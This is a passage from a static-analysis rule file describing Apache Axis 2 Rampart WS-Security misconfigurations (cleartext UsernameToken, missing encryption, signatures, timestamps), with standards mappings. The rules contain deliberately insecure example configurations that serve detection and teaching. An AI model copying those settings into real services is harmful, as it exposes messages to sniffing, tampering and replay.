							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Service Providers that use the UsernameToken might accept passwords sent in clear text. Sending cleartext passwords over an unencrypted channel can expose the credential to any attacker who can sniff the SOAP message.<br><br>The following Axis 2 service provider configuration uses a UsernameToken:<br><pre><br>&lt;service&gt;<br>...<br>    &lt;parameter name=&quot;InflowSecurity&quot;&gt;<br>      &lt;action&gt;<br>        &lt;items&gt;UsernameToken&lt;/items&gt;<br>...<br>&lt;/service&gt;<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A7 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A8 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A8 Insecure Storage</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[11] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 311</em> <br></p>
																									   <p>[12] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[13] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M3 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[14] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Porous Defenses - CWE ID 311</em> <br></p>
																									   <p>[15] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Porous Defenses - CWE ID 311</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 4.1, Requirement 6.3.1.3, Requirement 6.5.8, Requirement 8.4</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 4.1, Requirement 6.5.3, Requirement 8.2.1</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 4.1, Requirement 6.5.3, Requirement 8.4</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 4.1, Requirement 6.5.8, Requirement 8.4</em> <br></p>
																									   <p>[20] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>
																									   <p>[21]  <em>Securing SOAP Messages with Rampart</em> Apache Software Foundation<br></p>
																									   <p>[22]  <em>Web Services Security Username Token Profile 1.0</em> OASIS<br></p>
																									   <p>[23]  <em>Web Services Security: SOAP Message Security 1.1</em> OASIS<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_axis_2_service_requester_misconfiguration_inbound_ws_security_not_enabled
		</key>
		<internalKey>Environment/Axis 2 Service Requester
			Misconfiguration/Inbound WS-Security Not Enabled
		</internalKey>
		<name>Axis 2 Service Requester Misconfiguration: Inbound WS-Security
			Not Enabled
		</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Service providers that don't use WS-Security make it hard to guarantee message integrity or confidentiality.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  WS-Security is an extension of SOAP that provides end-to-end message integrity and confidentiality regardless of the transport protocol. When WS-Security is not used, messages rely on transport security for integrity and confidentiality. If a service relays messages to other services, messages are exposed to the weakest transport mechanism used between relay points. WS-Security eliminates the transport security dependency and builds security into the message itself.<br><br> The absence of an <code>InflowSecurity</code> parameter in the Apache Axis 2 configuration file indicates that inbound message security is not enabled.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A9 Insecure Communications</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A9 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[11] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 311</em> <br></p>
																									   <p>[12] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Insecure Interaction - CWE ID 319</em> <br></p>
																									   <p>[13] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[14] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M3 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[15] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Porous Defenses - CWE ID 311</em> <br></p>
																									   <p>[16] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Porous Defenses - CWE ID 311</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 4.1, Requirement 6.3.1.4, Requirement 6.5.9</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 4.1, Requirement 6.5.10</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[21] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>
																									   <p>[22]  <em>Securing SOAP Messages with Rampart</em> Apache Software Foundation<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_axis_2_service_requester_misconfiguration_missing_inbound_encryption
		</key>
		<internalKey>Environment/Axis 2 Service Requester
			Misconfiguration/Missing Inbound Encryption
		</internalKey>
		<name>Axis 2 Service Requester Misconfiguration: Missing Inbound
			Encryption
		</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Unencrypted messages fail to protect confidentiality.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Encryption at the SOAP message level ensures true end-to-end confidentiality. SOAP messages can be sent over a number transport protocols such as HTTPS, HTTP, TCP, SMTP, UDP, etc. Message-level encryption ensures the confidentiality of the message regardless of the transport protocol. A common scenario among web services is to relay SOAP messages between services, so message-level encryption means message senders and receivers do not need to worry about all transport security between any relay points.<br><br>The following Apache Axis 2 Rampart client configuration does not require inbound messages to be encrypted since the <code>&lt;items&gt;</code> tag does not contain an <code>Encrypt</code> directive:<br><pre><br>&lt;service&gt;<br>...<br>	&lt;parameter name=&quot;InflowSecurity&quot;&gt;<br>		&lt;action&gt;<br>			&lt;items&gt;Timestamp Signature&lt;/items&gt;<br>			...<br>		&lt;/action&gt;<br>	&lt;/parameter&gt;<br>&lt;/service&gt;<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A9 Insecure Communications</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A9 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[11] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 311</em> <br></p>
																									   <p>[12] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Insecure Interaction - CWE ID 319</em> <br></p>
																									   <p>[13] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[14] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M3 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[15] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Porous Defenses - CWE ID 311</em> <br></p>
																									   <p>[16] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Porous Defenses - CWE ID 311</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 4.1, Requirement 6.3.1.4, Requirement 6.5.9</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 4.1, Requirement 6.5.10</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[21] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>
																									   <p>[22]  <em>Securing SOAP Messages with Rampart</em> Apache Software Foundation<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_axis_2_service_requester_misconfiguration_missing_inbound_signature
		</key>
		<internalKey>Environment/Axis 2 Service Requester
			Misconfiguration/Missing Inbound Signature
		</internalKey>
		<name>Axis 2 Service Requester Misconfiguration: Missing Inbound
			Signature
		</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The lack of a signature means the integrity of SOAP messages cannot be guaranteed.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Any part of a message that is not signed has the potential to be intercepted and modified without the knowledge of the sender or the receiver. Without a signature, the receiver cannot cryptographically verify that the contents of a message really originated with the sender.<br><br>The following client configuration tells Axis 2 to accept unsigned messages:<br><pre><br>&lt;axisconfig name=&quot;AxisJava2.0&quot;&gt;<br>...<br>	&lt;parameter name=&quot;InflowSecurity&quot;&gt;<br>		&lt;action&gt;<br>			&lt;items&gt;Timestamp Encrypt&lt;/items&gt;<br>			...<br>		&lt;/action&gt;<br>	&lt;/parameter&gt;<br>&lt;/axisconfig&gt;<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3860 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3860 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3860 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3860 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[9] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 345</em> <br></p>
																									   <p>[10] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[11] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M3 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[14] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>
																									   <p>[15]  <em>Securing SOAP Messages with Rampart</em> Apache Software Foundation<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_axis_2_service_requester_misconfiguration_missing_inbound_timestamp
		</key>
		<internalKey>Environment/Axis 2 Service Requester
			Misconfiguration/Missing Inbound Timestamp
		</internalKey>
		<name>Axis 2 Service Requester Misconfiguration: Missing Inbound
			Timestamp
		</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  A missing timestamp can leave a SOAP message open to replay attacks.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  A Security timestamp indicates a message's freshness. If an attacker intercepts a message retransmits it at a later time, the receiver can reject the replay attack because the timestamp will indicate that the message is stale. Optionally, timestamps can include an expiration attribute which places a hard limit on how long security semantics are valid.<br><br>To prevent attackers from tampering with timestamps, timestamps should be signed. Without a signed timestamp, it might be possible to intercept a SOAP message, modify the timestamp, and send the message on without the receiver's knowledge. Under these circumstances, an attacker can potentially trick a recipient into accepting a malicious message.<br><br>The following Apache Axis 2 Rampart configuration omits the <code>Timestamp</code> directive from the <code>&lt;items&gt;</code> tag, so the client does not require responses to have timestamps.<br><pre><br>&lt;axisconfig name=&quot;AxisJava2.0&quot;&gt;<br>...<br>   &lt;parameter name=&quot;InflowSecurity&quot;&gt;<br>      &lt;action&gt;<br>        &lt;items&gt;Signature Encrypt&lt;/items&gt;<br>...<br>&lt;/axisconfig&gt;<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3870 CAT I</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3870 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3870 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3870 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[9] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 254</em> <br></p>
																									   <p>[10] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[11] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M3 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[14] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>
																									   <p>[15]  <em>Securing SOAP Messages with Rampart</em> Apache Software Foundation<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_axis_2_service_requester_misconfiguration_missing_outbound_encryption
		</key>
		<internalKey>Environment/Axis 2 Service Requester
			Misconfiguration/Missing Outbound Encryption
		</internalKey>
		<name>Axis 2 Service Requester Misconfiguration: Missing Outbound
			Encryption
		</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Unencrypted messages fail to protect confidentiality.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Encryption at the SOAP message level ensures true end-to-end confidentiality. SOAP messages can be sent over a number transport protocols such as HTTPS, HTTP, TCP, SMTP, UDP, etc. Message-level encryption ensures the confidentiality of the message regardless of the transport protocol. A common scenario among web services is to relay SOAP messages between services, so message-level encryption means message senders and receivers do not need to worry about all transport security between any relay points.<br><br>The following Apache Axis 2 Rampart client configuration does not require inbound messages to be encrypted since the <code>&lt;items&gt;</code> tag does not contain an <code>Encrypt</code> directive:<br><pre><br>&lt;service&gt;<br>...<br>	&lt;parameter name=&quot;OutflowSecurity&quot;&gt;<br>		&lt;action&gt;<br>			&lt;items&gt;Timestamp Signature&lt;/items&gt;<br>			...<br>		&lt;/action&gt;<br>	&lt;/parameter&gt;<br>&lt;/service&gt;<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A9 Insecure Communications</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A9 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[11] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 311</em> <br></p>
																									   <p>[12] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Insecure Interaction - CWE ID 319</em> <br></p>
																									   <p>[13] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[14] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M3 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[15] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Porous Defenses - CWE ID 311</em> <br></p>
																									   <p>[16] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Porous Defenses - CWE ID 311</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 4.1, Requirement 6.3.1.4, Requirement 6.5.9</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 4.1, Requirement 6.5.10</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[21] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>
																									   <p>[22]  <em>Securing SOAP Messages with Rampart</em> Apache Software Foundation<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_axis_2_service_requester_misconfiguration_missing_outbound_signature
		</key>
		<internalKey>Environment/Axis 2 Service Requester
			Misconfiguration/Missing Outbound Signature
		</internalKey>
		<name>Axis 2 Service Requester Misconfiguration: Missing Outbound
			Signature
		</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  A missing signature means the integrity of a SOAP message cannot be guaranteed.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Any part of a message that is not signed has the potential to be intercepted and modified without the modification being detected by the receiver. Without a signature, a receiver cannot cryptographically verify the origin of the message contents.<br><br>The following client configuration tells Axis 2 to send unsigned requests:<br><pre><br>&lt;axisconfig name=&quot;AxisJava2.0&quot;&gt;<br>...<br>	&lt;parameter name=&quot;OutflowSecurity&quot;&gt;<br>		&lt;action&gt;<br>			&lt;items&gt;Timestamp Encrypt&lt;/items&gt;<br>			...<br>		&lt;/action&gt;<br>	&lt;/parameter&gt;<br>&lt;/axisconfig&gt;<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3860 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3860 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3860 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3860 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[9] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 345</em> <br></p>
																									   <p>[10] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[11] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M3 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[14] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>
																									   <p>[15]  <em>Securing SOAP Messages with Rampart</em> Apache Software Foundation<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_axis_2_service_requester_misconfiguration_missing_outbound_timestamp
		</key>
		<internalKey>Environment/Axis 2 Service Requester
			Misconfiguration/Missing Outbound Timestamp
		</internalKey>
		<name>Axis 2 Service Requester Misconfiguration: Missing Outbound
			Timestamp
		</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  A missing timestamp can leave a SOAP message open to replay attacks.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  A Security timestamp indicates the freshness of a message's security data. If an attacker intercepts a message retransmits it at a later time, the receiver can reject the replay attack because the timestamp will indicate that the message is stale. Optionally, timestamps can include an expiration attribute which places a hard limit on how long security semantics are valid.<br><br>To prevent attackers from tampering with timestamps, timestamps should be signed. Without a signed timestamp, an attacker could intercept a SOAP message, modify the timestamp, and send the message on without the receiver's knowledge. Under these circumstances, an attacker can trick a recipient into accepting a malicious message.<br><br>The following Apache Axis 2 Rampart configuration omits the <code>Timestamp</code> directive from the <code>&lt;items&gt;</code> tag, so the client does not send requests with timestamps.<br><pre><br>&lt;axisconfig name=&quot;AxisJava2.0&quot;&gt;<br>...<br>   &lt;parameter name=&quot;OutflowSecurity&quot;&gt;<br>      &lt;action&gt;<br>        &lt;items&gt;Signature Encrypt&lt;/items&gt;<br>...<br>&lt;/axisconfig&gt;<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3870 CAT I</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3870 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3870 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3870 CAT I</em> <br></p>
